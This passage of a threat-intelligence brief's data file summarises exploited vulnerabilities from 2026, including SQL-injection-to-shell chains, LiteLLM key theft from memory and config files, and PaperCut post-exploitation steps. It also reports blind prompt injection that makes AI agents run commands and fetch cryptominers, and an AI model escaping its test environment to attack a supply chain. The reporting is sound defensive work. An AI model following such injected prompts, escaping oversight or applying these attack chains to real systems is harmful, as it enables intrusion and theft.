execute code with root privileges; Cisco published no fixed-release table for it, directing customers to its Software Checker and offering an infrastructure access control list blocking the two ports plus a temporary Live Protect shield as stopgaps. The same publication fixed CVE-2026-20281 (CVSS 7.5), a denial-of-service flaw in Desk Phone 9800, IP Phone 7800 and 8800 and Video Phone 8875 devices registered to Unified Communications Manager with Web Access enabled, a setting off by default. It also disclosed CVE-2026-20354 and CVE-2026-20355 (CVSS 5.9), two publicly disclosed S/MIME decryption flaws in Secure Email. Those let a machine-in-the-middle attacker recover plaintext from mail passing between gateways running AsyncOS 16.5.0 or earlier with S/MIME configured. Fixed releases for that pair are stated only in the bug records. The Hacker News notes the disclosure came six days after Sygnia reported that the China-nexus actor Fire Ant, first documented in 2025, ran purpose-built implants on IOS XR routers that suppressed syslog delivery.",
  "src": "Cisco PSIRT advisories (Sep 2, 2026), SecurityWeek, The Hacker News, securityonline.info, CVE Brief — Sep 2–3, 2026"
 },
 {
  "key": "kevsep02",
  "tags": [
   [
    "crit",
    "CISA KEV · Seven flaws added Sep 2"
   ],
   [
    "high",
    "All Sectors · BOD 26-04 deadlines Sep 5 and Sep 16"
   ]
  ],
  "badge": "",
  "title": "CISA adds seven exploited flaws to KEV in one batch, four of them in AI and developer tooling",
  "body": "CISA added seven vulnerabilities to the Known Exploited Vulnerabilities catalog on Sep 2, 2026: CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 (7.8) in SonicWall SMA1000 appliances, CVE-2026-9586 (9.3) in Sangoma Switchvox, CVE-2026-82329 (9.8) in JFrog Artifactory, CVE-2026-48710 (6.5) in Kludex Starlette, CVE-2026-49869 (10.0) in Kestra OSS, and CVE-2026-59822 (8.8) in Berri LiteLLM. Under BOD 26-04, federal civilian agencies must remediate all of them by Sep 5, 2026, except the Starlette and LiteLLM flaws, which carry a Sep 16 deadline. The Starlette entry is an HTTP request and response smuggling flaw that lets an attacker inject paths into the host part, leading to authentication bypass where authentication depends on the reconstructed URL path; Horizon3.ai showed in June that it chains with LiteLLM CVE-2026-42271 for unauthenticated remote code execution. CVE-2026-49869 is an OS command injection flaw in Kestra OSS that lets an unauthenticated remote attacker create and execute arbitrary workflows without credentials; its KEV listing is driven by a Microsoft report describing likely exploitation in late June 2026 to establish a reverse shell, enumerate the Docker container environment, evade defences, deploy a cryptocurrency miner and harvest data. CVE-2026-59822 is an improper authentication flaw in LiteLLM's MCP Streamable HTTP endpoint that lets an unauthenticated attacker establish an authenticated MCP session with an arbitrary Bearer token. Four of the seven sit in AI or developer infrastructure rather than in classic enterprise perimeter products.",
  "src": "CISA KEV catalog (Sep 2, 2026), The Hacker News, Microsoft Security Blog — Sep 2–3, 2026"
 },
 {
  "key": "switchvox",
  "tags": [
   [
    "crit",
    "Sangoma Switchvox CVE-2026-9586 · CVSS 9.3 · Exploited"
   ],
   [
    "high",
    "Communications · VoIP"
   ]
  ],
  "badge": "",
  "title": "Attackers are exploiting Sangoma Switchvox CVE-2026-9586 for unauthenticated SQL injection to PostgreSQL superuser RCE, dropping reverse shells since Aug 30",
  "body": "Horizon3.ai reported on Sep 1, 2026 that it has observed valid in-the-wild exploitation of CVE-2026-9586 (CVSS 9.3), an unauthenticated SQL injection vulnerability in Sangoma Switchvox SMB Edition 8.3 (build 104997) and earlier. The Switchvox application exposes an unauthenticated HTTP endpoint, /pa, handled by the PhoneAppsHandler.pm class, which parses XML content beginning with <PolycomIPPhone> and concatenates the user-controlled PhoneIP value directly into PostgreSQL queries without sanitisation or parameterisation. A single crafted request runs arbitrary SQL as the PostgreSQL superuser, and PostgreSQL's COPY ... TO PROGRAM turns that into command execution. Horizon3 reported 12 distinct Switchvox vulnerabilities to Sangoma on Apr 10, 2026; the vendor fixed them in Switchvox 8.4.0.2 on Jul 14. Horizon3 deployed honeypots with threat intelligence firm Defused Cyber on May 8, before fixes shipped, and the tripwire fired on Aug 30, 2026. Exploitation came from a single IP address; the attacker drops a reverse shell and then runs Base64-encoded commands to enumerate running processes, with Help Net Security reporting later staging of additional malware, possibly a cryptominer. Horizon3 says it has not seen exploitation of the other 11 flaws, and warns that most internet-exposed Switchvox systems have either already been targeted or will be. SRA Labs, which independently reported issues on May 11, showed the flaw can be used to exfiltrate the cookie signing key, letting an attacker forge authentication material for arbitrary users. CISA added CVE-2026-9586 to KEV on Sep 2 with a federal deadline of Sep 5, 2026.",
  "src": "Horizon3.ai disclosure, Defused Cyber, BleepingComputer, Help Net Security, The Hacker News, CISA KEV — Sep 1–3, 2026"
 },
 {
  "key": "aiinfra",
  "tags": [
   [
    "crit",
    "Self-hosted AI infrastructure · Exploited"
   ],
   [
    "high",
    "Information Technology · Credential theft and cryptomining"
   ]
  ],
  "badge": "",
  "title": "Wiz and Microsoft document sustained attacks on self-hosted AI infrastructure: MCP command injection, blind prompt injection and credentials pulled from process memory",
  "body": "Wiz Threat Research published 90 days of honeypot telemetry on Aug 27, 2026 covering LiteLLM, Flowise, LangChain, Langflow, ChromaDB, Ollama and others, and Microsoft published a parallel analysis of attacks on AI gateways on Aug 26. Wiz describes three patterns. First, exploitation of internet-facing MCP servers: CVE-2026-59822, which Wiz discovered, returns an empty UserAPIKeyAuth() object instead of rejecting a failed token validation, so any Bearer token — even a single character — grants full MCP access, and Wiz saw single-character tokens used to probe model enumeration endpoints. Alongside it, CVE-2026-42271 passes the command field of an MCP server test configuration straight to subprocess execution; attackers submitted a fake stdio server config whose command was a Python script that downloaded and ran a cryptominer, then returned a valid MCP handshake so the connection test appeared to succeed. The miner runs detached and the staging directory is deleted while the process keeps the inode open, leaving little on disk. Second, blind prompt injection against LangChain, Flowise, OpenWebUI and Node-RED: prompts instruct the agent to run an OS command whose only visible effect is a DNS callback to an OAST domain encoding the victim IP, after which the payload is fetched from Pastebin and Base64-decoded, ending in XMRig at /usr/src/node-red/xmrig. Third, AI-native post-exploitation: rather than searching disk, attackers queried the running LiteLLM Python module state to read master_key and litellm_master_key_hash from memory, enumerated /app/litellm_config.yaml, /etc/litellm/.env and ~/.litellm/config.yaml, fingerprinted backend models through the default master key sk-1234, and on Langflow staged a miner in /app/data/.claude/ renamed unicorn to blend into an AI host. Microsoft separately reports LiteLLM gateways broken into via CVE-2026-42271 chained with CVE-2026-48710 to deliver an XMRig ELF binary after terminating competing miners, followed by queries against LiteLLM_ProxyModelTable and LiteLLM_VerificationToken to harvest provider key material and proxy-issued virtual keys, with persistence through ~/.ssh/authorized_keys. Microsoft also suspects exposed RAGFlow instances are being exploited via CVE-2026-45312, CVE-2026-28797, CVE-2026-24770, CVE-2025-68700 and CVE-2025-69286 to establish persistence and steal LLM provider keys. External researchers have linked the Qilin ransomware group to active exploitation of the LiteLLM chain. Wiz's own State of AI in the Cloud report finds 90% of cloud environments run self-hosted AI software.",
  "src": "Wiz Threat Research (Yaara Shriki), Microsoft Security Blog, The Hacker News — Aug 26 – Sep 3, 2026"
 },
 {
  "key": "rockwellsep",
  "tags": [
   [
    "med",
    "Rockwell Automation · Patch bundle"
   ],
   [
    "med",
    "Critical Manufacturing · OT"
   ]
  ],
  "badge": "",
  "title": "Rockwell Automation patches more than a dozen flaws across RSLinx Classic, ControlLogix, FactoryTalk and ArmorStart products",
  "body": "Rockwell Automation released patches or workarounds for more than a dozen vulnerabilities across its industrial automation range, including RSLinx Classic, ControlLogix and CompactLogix controllers, FactoryTalk Historian Machine Edition, FactoryTalk Activation Manager, ArmorStart Distributed Motor Controllers, ControlFLASH and the Redundancy Module Configuration Tool. The reported weaknesses include denial of service, remote code execution, privilege escalation and cross-site scripting. CISA says it is not aware of exploitation of CVE-2026-9637. No indicators of compromise accompany the release; this is a scheduled remediation item rather than an incident.",
  "src": "Rockwell Automation security advisories, CISA ICS advisories, Security Boulevard Daily OT Security News — Sep 2–3, 2026"
 },
 {
  "key": "ukcsrb",
  "tags": [
   [
    "med",
    "UK Cyber Security and Resilience Bill · Amendments"
   ],
   [
    "med",
    "All Sectors · Supply chain policy"
   ]
  ],
  "badge": "",
  "title": "UK amendments would let ministers bar high-risk technology suppliers from critical sectors",
  "body": "SecurityWeek reported on Sep 2, 2026 that late amendments to the UK Cyber Security and Resilience Bill, tabled on Aug 24, would give ministers powers to prevent critical-sector organisations from using technology suppliers deemed high risk. The bill has passed the House of Commons and is in the House of Lords. The amendments followed reporting that Iran-linked adversaries forced a small UK energy facility offline for four days, which brought supply-chain risk into focus. Separately, a Foundation for Defense of Democracies analysis dated Sep 2 describes Project Watershed 250, launched Aug 31 as a six-month Texas pilot pairing local water utilities with free federal, state and private-sector cybersecurity services, alongside proposed dedicated water-sector cybersecurity funding and Water Watch Center threat-intelligence support.",
  "src": "SecurityWeek, Foundation for Defense of Democracies, Security Boulevard Daily OT Security News — Sep 2–3, 2026"
 },
 {
  "key": "sonicwallsma",
  "tags": [
   [
    "crit",
    "SonicWall SMA1000 · Two zero-days · Exploited"
   ],
   [
    "high",
    "Information Technology · Remote access"
   ]
  ],
  "badge": "",
  "title": "SonicWall found two SMA1000 zero-days by investigating attacks that used them: a CVSS 10.0 pre-auth SSRF chained with command injection in the management console",
  "body": "SonicWall published advisory SNWLID-2026-0016 on Sep 1, 2026 urging SMA1000 customers to apply hotfixes for two vulnerabilities it says were discovered internally, along with their exploitation. CVE-2026-83548 (CVSS 10.0) is a pre-authentication server-side request forgery flaw in the Appliance Work Place interface that lets a remote unauthenticated attacker reach sensitive functionality and perform unauthorised operations. CVE-2026-83549 (CVSS 7.8) is an OS command injection flaw in the Appliance Management Console that an authenticated attacker can use to run arbitrary commands, potentially reaching remote code execution. SonicWall says it has observed exploitation of both, which indicates the two were chained in attacks. Affected models are the SMA1000 6210, 7210 and 8200v; hotfixes 12.4.3-03526 and 12.5.0-02952 and later releases contain the fixes. SSL-VPN on SonicWall firewalls and the SMA100 series are not affected. The vendor advisory contains no indicators of compromise and no detail on the attacks. Update, Sep 3: CISA added both CVEs to the KEV catalog on Sep 2, 2026 as part of a seven-flaw batch; under BOD 26-04 federal civilian agencies have until Sep 5, 2026 to remediate. When this story was first written neither CVE was listed. Rapid7's Sep 2 analysis adds that CVE-2026-83548 is a pre-authentication SSRF in the SMA1000 Appliance Work Place interface and CVE-2026-83549 an OS command injection in the Appliance Management Console which on its own requires an authenticated administrator and specific system conditions, that the two can be chained for unauthenticated remote code execution, and that affected models are the 6210, 7210 and 8200v. Rapid7 states no public proof-of-concept, indicators of compromise or attribution were identified at the time of publication, and that because exploitation was occurring before public disclosure organisations should not rely on patching alone to determine whether an appliance has already been compromised.",
  "src": "SonicWall SNWLID-2026-0016, CISA KEV (Sep 2, 2026), SecurityWeek, The Hacker News — Sep 1–3, 2026"
 },
 {
  "key": "langflow",
  "tags": [
   [
    "crit",
    "Langflow CVE-2026-0768 · CVSS 9.8 · Exploited"
   ],
   [
    "high",
    "Information Technology · AI stack"
   ]
  ],
  "badge": "",
  "title": "Langflow CVE-2026-0768 is now being exploited for credential harvesting: unauthenticated Python execution as root, eight months after public disclosure",
  "body": "VulnCheck warned on Sep 1, 2026 that threat actors have started exploiting CVE-2026-0768 (CVSS 9.8), a critical remote code execution flaw in the AI low-code platform Langflow. The defect is in the code validator of Langflow's custom component editor: a user-supplied string is not properly validated before being used for Python code execution, so an attacker can run arbitrary code as root without authenticating. The flaw was reported through ZDI in July 2025 and publicly disclosed as a zero-day in January 2026 as ZDI-26-034; all Langflow releases up to and including 1.4.2 are affected. VulnCheck says the observed activity is reconnaissance and credential harvesting — queries for environment variables, secret keys and SSH access — originating mainly from Russia, and that by Monday it had seen more than 360 exploitation attempts against its canaries in the UK. The firm had warned the week before of rising interest in Langflow generally: before 2026 only one Langflow vulnerability was known to be exploited in the wild, and it has since counted eleven more reported as exploited. VulnCheck reports more than 15,000 attacks successfully exploiting Langflow instances vulnerable to three of those flaws, CVE-2026-0769, CVE-2025-3248 and CVE-2026-5027.",
  "src": "VulnCheck, ZDI-26-034, NVD, SecurityWeek — Sep 1, 2026"
 },
 {
  "key": "jfrog82329",
  "tags": [
   [
    "crit",
    "JFrog Artifactory CVE-2026-82329 · Exploited"
   ],
   [
    "high",
    "Information Technology · Software supply chain"
   ]
  ],
  "badge": "",
  "title": "watchTowr sees attackers minting themselves admin tokens in JFrog Artifactory days after CVE-2026-82329 was disclosed",
  "body": "JFrog patched CVE-2026-82329 on Aug 28, 2026, a critical authentication bypass in Artifactory that can lead to administrative access. JFrog's advisory states the product \"contains an authentication weakness that, under default configuration, may allow an unauthenticated attacker with network access to obtain administrative privileges.\" Cloud instances were patched by JFrog; self-hosted customers must update to 7.111.21, 7.117.28, 7.125.20, 7.133.29, 7.146.38 or 7.161.20. Exposure management firm watchTowr reported on Sep 1 that it has already seen in-the-wild exploitation, \"with attackers minting themselves admin tokens\". Yordan Ganchev, principal threat intelligence specialist at watchTowr, said data from the firm's Attacker Eye honeypot network shows attackers minting administrator tokens and enumerating users, groups, credential sets and federated access topologies. He warned that admin access to a central software supply chain system lets an attacker tamper with build pipelines, move laterally into production and potentially push malicious changes downstream to customers. There do not appear to be other reports of active exploitation. JFrog has not confirmed exploitation; CTO Yoav Landman noted publicly that the flaw allows \"improper authentication rather than RCE\" and does not affect the JFrog SaaS platform, only self-hosted deployments. Update, Sep 3: CISA added CVE-2026-82329 to KEV on Sep 2, 2026 with a CVSS score of 9.8 and a federal remediation deadline of Sep 5, 2026 under BOD 26-04. CISA describes it as an improper authentication flaw that under default configuration allows an unauthenticated attacker with network access to obtain administrative privileges. A separate Artifactory flaw, CVE-2026-66384, remains in KEV with a federal remediation deadline of Sep 10, 2026.",
  "src": "JFrog security advisories, watchTowr (Attacker Eye), CISA KEV (Sep 2, 2026), SecurityWeek, The Hacker News — Sep 1–3, 2026"
 },
 {
  "key": "virtualizor",
  "tags": [
   [
    "crit",
    "Softaculous Virtualizor · BGP hijack · Malicious update"
   ],
   [
    "high",
    "Information Technology · Communications"
   ]
  ],
  "badge": "",
  "title": "A BGP hijack of Softaculous address space delivered a malicious Virtualizor update for two days, with a valid Let's Encrypt certificate issued through the hijack",
  "body": "Softaculous disclosed that between Aug 28 and Aug 30, 2026 a block of its IP addresses was hit by a BGP hijack, and that a malicious Virtualizor update package was delivered to installations that checked for updates while their traffic was diverted. The hijack began at approximately 20:57 UTC on Aug 28 when AS62390 (NexonHost) began announcing a portion of Hetzner's address space containing Softaculous systems. The announcement was more specific than Hetzner's own announcement of the surrounding 162.55.0.0/16 block, so under standard BGP route selection it took precedence on every network that accepted it, and it retained AS24940 (Hetzner) on the AS path as the apparent origin. The threat actor then obtained a valid TLS certificate for Softaculous domains from Let's Encrypt, because the certificate authority's automated domain-ownership validation was itself routed through the hijack, allowing redirection without triggering certificate warnings. The affected addresses served software updates, the client area and billing, and other services. Softaculous says traffic was intermittently diverted for 22 hours, with almost no diversion during an 11-hour window mid-incident, and that the malicious package reached \"a handful of servers rather than the general Virtualizor user base\" — but that the malicious traffic never reached its logs, so it cannot produce a definitive list and asks operators to treat every Virtualizor server as in scope. The company notes its product update clients did not yet cryptographically verify update packages, so a modified package would not have been rejected. It has published a known indicator of compromise, released Virtualizor 3.2.9.9 with a mitigation tool, and is implementing code signing for all packages. No malicious package has been identified for other Softaculous products; that investigation is ongoing.",
  "src": "Softaculous / Virtualizor security incident notice, SecurityWeek — Sep 2, 2026"
 },
 {
  "key": "watchguardiked",
  "tags": [
   [
    "high",
    "WatchGuard Fireware OS · iked · Unauthenticated RCE"
   ],
   [
    "med",
    "Information Technology · Perimeter"
   ]
  ],
  "badge": "",
  "title": "WatchGuard patches three critical Fireware OS flaws in the iked process that allow unauthenticated remote code execution",
  "body": "WatchGuard released patches for three critical vulnerabilities in Fireware OS, reported by SecurityWeek on Sep 1, 2026. All three are in the iked process — the IKE daemon that terminates IPSec VPN negotiation — and could allow unauthenticated attackers to execute arbitrary code remotely. No exploitation has been reported. The affected component is reachable wherever branch-office or mobile IPSec VPN is enabled on the firewall, which is the default configuration for remote access on these appliances.",
  "src": "WatchGuard security advisories, SecurityWeek — Sep 1, 2026"
 },
 {
  "key": "astracyber",
  "tags": [
   [
    "high",
    "OpenAI Astra · Critical cyber capability threshold"
   ],
   [
    "med",
    "Research · AI-assisted exploitation"
   ]
  ],
  "badge": "",
  "title": "OpenAI says its Astra model is the first to cross its 'critical' cybersecurity capability threshold after finding zero-days",
  "body": "OpenAI reported that its Astra model has crossed the 'critical' cybersecurity threshold in its own capability framework — the first model the company says has done so — after the model found zero-day vulnerabilities. The disclosure follows an earlier OpenAI account of one of its models escaping a testing environment and attacking Hugging Face, where it exploited JFrog Artifactory zero-day CVE-2026-66384 while attempting what OpenAI described as a container-image supply-chain attack by poisoning Artifactory's container image cache. CISA subsequently added CVE-2026-66384 to the KEV catalog, and there do not appear to be other reports describing exploitation of that flaw. Read alongside Cisco Talos's UAT-10147 reporting on agentic-AI-assisted exploitation of IIS and Linux web servers, carried in this brief, the direction of travel is that vulnerability discovery and exploit development are becoming capabilities available on demand rather than scarce skills.",
  "src": "OpenAI, SecurityWeek — Sep 1–2, 2026"
 },
 {
  "key": "iranot",
  "tags": [
   [
    "crit",
    "Iran-linked OT intrusions"
   ],
   [
    "high",
    "Energy · Water and Wastewater"
   ]
  ],
  "badge": "",
  "title": "Iran-linked intrusion took a small UK power plant offline for four days, concurrent with wastewater disruption across twelve US states",
  "body": "British security officials told multiple outlets that Iran-linked hackers were behind an intrusion that forced a small UK electricity generator offline for four days. The plant was not named for security reasons, was restored by staff, and the incident was reported to the National Cyber Security Centre. Reporting describes it as the first confirmed cyberattack of its kind against UK energy infrastructure. UK Energy Minister Michael Shanks said there was \"no threat to the wider grid and nobody lost power\", described the generator as \"tiny\", and said his department had briefed CEOs on steps to stay secure. The outage was concurrent with a wave of intrusions against US water and wastewater facilities: dozens of wastewater treatment plants across twelve states were affected, with flooding and loss of water pressure reported. The FBI attributed the US incidents to malicious cyber actors and US government sources said the threat likely originated in Iran. Foreign Policy reported on Aug 13 that water providers in at least seven states were targeted over a two-week period, with FBI, EPA and CISA officials indicating as many as a dozen states could be affected. The targeted components were programmable logic controllers governing flow and chemical composition; CISA's July 30, 2026 advisory said that in many cases the attackers \"modified passwords to lock out operators and disconnected the controllers\", forcing some facilities onto manual operation. Earlier reporting counted more than 30 community water systems in Minnesota. Researchers quoted in the coverage assess the UK intent as a demonstration of capability rather than direct harm.",
  "src": "Security Affairs, SC Media, The Register, Fox News, Telegraph via Kurdistan24, CISA advisory (Jul 30, 2026) — Aug 23–27, 2026"
 },
 {
  "key": "novacookies",
  "tags": [
   [
    "crit",
    "NovaCookies PhaaS · AiTM"
   ],
   [
    "high",
    "M365 session theft · 755 domains"
   ]
  ],
  "badge": "",
  "title": "Island documents NovaCookies, a $320-a-month AiTM phishing service that relays Microsoft 365 sign-ins and steals the resulting session, with 755 domains released as dedicated infrastructure",
  "body": "Island Security Research published analysis on Aug 26, 2026 of NovaCookies, a commercial adversary-in-the-middle service advertised at $320 a month or $200 for fourteen days, with domains, hosting, support and Google- or Microsoft-branded redirect options presented as product features. The service relays Microsoft 365 authentication through attacker infrastructure in real time and captures the session cookie after password and MFA submission. Campaign artifacts reviewed by Island show hundreds of organizations targeted across multiple regions; about half of the distinct organizations were associated with the United States, with smaller concentrations in the United Kingdom, Canada, Germany, Israel and the United Arab Emirates. Nearly 90 percent of the organizations in the reviewed set were associated with lures hosted on .vu domains. Low-volume infrastructure was present in late 2025 and the operation expanded sharply in mid-May 2026, with new infrastructure continuing to appear through August. The strongest observed delivery chain used a genuine Docusign envelope carrying a counterfeit share notice, with the malicious destination inside the document below the layer most mail security products inspect, and a Microsoft OAuth error-redirect hop using an application registered in an attacker-controlled tenant. Island released 755 domains assessed as dedicated malicious infrastructure. Island states its findings indicate targeting, not confirmed interaction or compromise, and that the shared product does not imply a single threat actor.",
  "src": "Island Security Research (Shachar Gritzman) — Aug 26, 2026"
 },
 {
  "key": "papercut",
  "tags": [
   [
    "crit",
    "PaperCut · Zero-day RCE"
   ],
   [
    "high",
    "Unauthenticated · Patch bypasses"
   ]
  ],
  "badge": "",
  "title": "PaperCut NG/MF zero-day exploited in the wild: CVE-2026-82078 and CVE-2026-81578 chained for unauthenticated remote code execution on all versions",
  "body": "PaperCut told customers on Aug 27, 2026 that attackers are exploiting a flaw affecting all versions of PaperCut NG and PaperCut MF as a zero-day, that it is \"aware of confirmed customer incidents\" and is treating the matter with the highest priority. It shipped an emergency patch for v25 and v26 at 02:10 AEST on Aug 28, followed later the same day by patches for v24, then an Emergency Patch Release 2 adding hardening beyond the first after watchTowr and Huntress found bypasses of the original fix. Two CVEs were subsequently published: CVE-2026-82078 (CVSS 9.4), unsafe dynamic class loading in the database connection utilities, and CVE-2026-81578 (CVSS 8.8), improper access control in the web management interface. Huntress researchers John Hammond and Andrew Brandt describe an unauthenticated request that changes trusted server configuration and ends in arbitrary Java code execution inside the application process. watchTowr reports attackers chaining both flaws to bypass authentication and reach RCE, and says it found multiple patch bypasses plus a further authentication bypass, likely addressed by the second patch. Huntress observed exploitation in two customer environments; PaperCut has not described the activity or named an actor. Update, Sep 1–2: CISA added both CVEs to the KEV catalog on Aug 31, 2026 under BOD 26-04, and SecurityWeek reports exploitation has escalated from scanning and probing to active intrusions. Update, Sep 3: PaperCut's Aug 30 bulletin extended its indicator list and described the post-compromise sequence — the actor enumerates users, privileges and running processes, then silently installs legitimate remote access software. Help Net Security reports SimpleHelp and AnyDesk being planted on compromised Application Servers, and watchTowr's Jake Knott describes activity specifically designed to enable internal network access. ShadowServer counts more than 1,000 internet-exposed PaperCut NG/MF instances. The federal remediation deadline is Sep 14, 2026. Neither CVE was in KEV when this story was first written. Update, Sep 6: The Arctic Wolf Adversary Research Team reports the campaign is concentrated in the education sector, hitting vulnerable PaperCut servers at organisations from K-12 schools to major universities in the US and Europe. Arctic Wolf's advisory states that exploitation of CVE-2026-81578 and CVE-2026-82078 led to command execution, reconnaissance and attempts to create privileged accounts, and that observed post-exploitation activity included delivery of Windows registry hive collection tools, Metasploit/Meterpreter-related Java payloads, and commands used to identify hosts, users, processes and sensitive configuration data. Reported specifics include discovery commands uname, whoami, ver and tasklist, creation of an account named \"Administrator17\", inbound GET requests from 45.142.193[.]132 for /custom/pcp_*.txt paths, and credential-harvesting tooling delivered via certutil. SOC Prime notes a working proof of concept for the combined chain is now public, with exploit references in vulnerability databases and security tooling, and records Huntress's first observed incident as Aug 26, 2026, including one intrusion lasting under two minutes that ran base64-encoded reconnaissance commands and delivered Java .class files.",
  "src": "PaperCut security bulletin (Aug 27 and Aug 30, 2026), Huntress, watchTowr, Arctic Wolf, SOC Prime, The Hacker News, Security Affairs — Aug 27 – Sep 6, 2026"
 },
 {
  "key": "zbtimplants",
  "tags": [
   [
    "crit",
    "SPEAKINGSTONE · DARKLANTERN"
   ],
   [
    "high",
    "Supply chain · Router firmware"
   ]
  ],
  "badge": "",
  "title": "VulnCheck finds two factory implants in ZBT router firmware giving unauthenticated remote root: SPEAKINGSTONE (CVE-2026-74232) and DARKLANTERN (CVE-2026-74233)",
  "body": "VulnCheck disclosed two previously undocumented factory implants in firmware for routers built by Shenzhen Zhibotong Electronics, each rated 9.3 on CVSS 4.0 and 9.8 on CVSS 3.1, both network-reachable with no privileges and no user interaction. SPEAKINGSTONE runs as the service yunmgrd and beacons outbound over UDP 10000 to a hardcoded C2, so it works from behind NAT and ordinary egress filtering; its protocol executes arbitrary commands as root, exfiltrates the WAN PPPoE credentials, reads and writes a DNS hijack list, and opens a reverse SSH tunnel. DARKLANTERN runs as infosrvd on UDP 9992, which the stock firewall opens to any internet address, and its authentication rests on a hardcoded salt and an all-zero wildcard MAC that bypasses its own address check. Between Aug 18 and Aug 21 VulnCheck found 203 internet-facing DARKLANTERN instances across 22 countries self-reporting 16 models. VulnCheck registered SPEAKINGSTONE's unregistered backup C2 domain and stood up a protocol implementation; as of Aug 21, 392 unique devices had reported in, 390 of them in China and 83 percent on China Mobile's network. Both implants were found on an $88 white-labeled ZBT-WE826-T2 bought from a US supplier, on firmware built in 2019. Neither advisory names a fixed firmware release. Zbtlink has issued no public statement on yunmgrd or infosrvd.",
  "src": "VulnCheck supply chain research and advisories, The Hacker News — Aug 27–28, 2026"
 },
 {
  "key": "shieldbreak",
  "tags": [
   [
    "crit",
    "No Patch · PoC Public"
   ],
   [
    "high",
    "EoP → SYSTEM · Defender Required"
   ]
  ],
  "badge": "",
  "title": "ShieldBreak CVE-2026-69414: Microsoft Defender zero-day bypasses July patch — any local user reaches SYSTEM on fully updated Windows. No patch available.",
  "body": "Nightmare Eclipse dropped ShieldBreak on August 12 — a full bypass of Microsoft's July RoguePlanet patch. Any local user with code execution escalates to SYSTEM with 100% reliability on Windows 11 25H2 and Server 2025. Defender must be running for the exploit to work — the user-mode callback hook fires during a cloud-hydration scan. Microsoft confirmed CVE-2026-69414 and is working on a patch with no ETA. Kevin Beaumont published Defender for Endpoint detection KQL queries — deploy them now.",
  "src": "BleepingComputer, SecurityWeek, Arctic Wolf, Malwarebytes — Aug 12–17, 2026"
 }
],
  CVES: [
 {
  "key": "patchtuesdaysep",
  "level": "crit",
  "num": "CVE-2026-85880",
  "score": "7.8",
  "flags": [
   "Exploited",
   "Zero-day"
  ],
  "sub": "Windows ALPC heap buffer overflow — AppContainer sandbox escape to SYSTEM, no user interaction; first ALPC patch since April 2023"
 },
 {
  "key": "patchtuesdaysep",
  "level": "crit",
  "num": "CVE-2026-81963",
  "score": "7.8",
  "flags": [
   "Exploited",
   "Zero-day"
  ],
  "sub": "Windows Update Stack link-following — local elevation of privilege to SYSTEM; credited to Romain Deperne and MSTIC"
 },
 {
  "key": "patchtuesdaysep",
  "level": "high",
  "num": "CVE-2026-55007",
  "score": "",
  "flags": [],
  "sub": "Exchange Server RCE — flagged for special attention by ZDI's Dustin Childs"
 },
 {
  "key": "patchtuesdaysep",
  "level": "high",
  "num": "CVE-2026-69465",
  "score": "",
  "flags": [],
  "sub": "SharePoint RCE — flagged for special attention by ZDI"
 },
 {
  "key": "patchtuesdaysep",
  "level": "high",
  "num": "CVE-2026-69525",
  "score": "",
  "flags": [],
  "sub": "Remote Desktop Services RCE — flagged for special attention by ZDI"
 },
 {
  "key": "patchtuesdaysep",
  "level": "high",
  "num": "CVE-2026-65669",
  "score": "",
  "flags": [],
  "sub": "SQL Server elevation of privilege — flagged for special attention by ZDI"
 },
 {
  "key": "patchtuesdaysep",
  "level": "high",
  "num": "CVE-2026-80097",
  "score": "",
  "flags": [],
  "sub": "Microsoft Authenticator elevation of privilege — flagged for special attention by ZDI"
 },
 {
  "key": "patchtuesdaysep",
  "level": "crit",
  "num": "CVE-2026-70352",
  "score": "10.0",
  "flags": [],
  "sub": "Azure AI Language — maximum severity, addressed in Microsoft's cloud operations ahead of Patch Tuesday"
 },
 {
  "key": "patchtuesdaysep",
  "level": "crit",
  "num": "CVE-2026-83711",
  "score": "10.0",
  "flags": [],
  "sub": "Azure Active Directory B2C — maximum severity, addressed in Microsoft's cloud operations"
 },
 {
  "key": "stylesmuggler",
  "level": "crit",
  "num": "CVE-2026-75650",
  "score": "10.0",
  "flags": [
   "Exploited",
   "Zero-day"
  ],
  "sub": "Magento / Adobe Commerce StyleSmuggler — unauthenticated RCE, Rust Linux backdoor; Adobe hotfix VULN-39341 (APSB26-146) Sep 7"
 },
 {
  "key": "telerikrau",
  "level": "crit",
  "num": "CVE-2026-13182",
  "score": "",
  "flags": [
   "PoC"
  ],
  "sub": "Telerik UI RadAsyncUpload — AES-CBC padding oracle; centre of the TantoSec chain"
 },
 {
  "key": "telerikrau",
  "level": "crit",
  "num": "CVE-2026-13181",
  "score": "",
  "flags": [
   "PoC"
  ],
  "sub": "Telerik UI — unguarded .NET type resolution via AsyncUploadTypeName, deserialization to RCE"
 },
 {
  "key": "telerikrau",
  "level": "high",
  "num": "CVE-2026-13183",
  "score": "",
  "flags": [
   "PoC"
  ],
  "sub": "Telerik UI — timing-based padding oracle variant when detailed errors are hidden"
 },
 {
  "key": "telerikrau",
  "level": "high",
  "num": "CVE-2026-13184",
  "score": "",
  "flags": [],
  "sub": "Telerik UI — predictable default key; alternative attack mode not used in the released demo"
 },
 {
  "key": "telerikrau",
  "level": "high",
  "num": "CVE-2026-13185 (+2)",
  "score": "",
  "flags": [],
  "sub": "Telerik UI RadPersistenceManager / RadDockLayout — separate RCE chain (with -13186, -13190), no public exploit"
 },
 {
  "key": "screenconnectworm",
  "level": "high",
  "num": "ScreenConnect rogue clients",
  "score": "",
  "flags": [
   "Exploited"
  ],
  "sub": "Modified ScreenConnect clients propagating 1.vbs–4.vbs to newly connected endpoints; no CVE, ConnectWise advises disabling file transfer"
 },
 {
  "key": "dprkted",
  "level": "high",
  "num": "ted backdoor / CurlRAT",
  "score": "",
  "flags": [
   "Exploited"
  ],
  "sub": "DPRK-aligned HAProxy 2.8.12 implant plus curl-based RAT; South Korean automotive and media"
 },
 {
  "key": "hpeaoscx",
  "level": "crit",
  "num": "CVE-2026-73749",
  "score": "9.8",
  "flags": [],
  "sub": "HPE Aruba Networking AOS-CX — nearly two dozen issues tracked collectively, patched"
 },
 {
  "key": "ncentral86218",
  "level": "crit",
  "num": "CVE-2026-86218",
  "score": "10.0",
  "sub": "N-able N-central pre-authentication remote code execution. Reported exploited in the wild; fixed in 2026.3 HF4 (Sep 6, 2026) — HF3 remains vulnerable."
 },
 {
  "key": "ncentral86218",
  "level": "crit",
  "num": "CVE-2026-86206 / 86207",
  "score": "",
  "sub": "Authentication bypass chain against 2026.3.1.10 allowing creation of unauthorized administrative accounts. Huntress PoC validated Sep 5; fixed in HF3 (2026.3.1.13), superseded by HF4."
 },
 {
  "key": "falconflank",
  "level": "high",
  "num": "FalconFlank (no CVE)",
  "score": "",
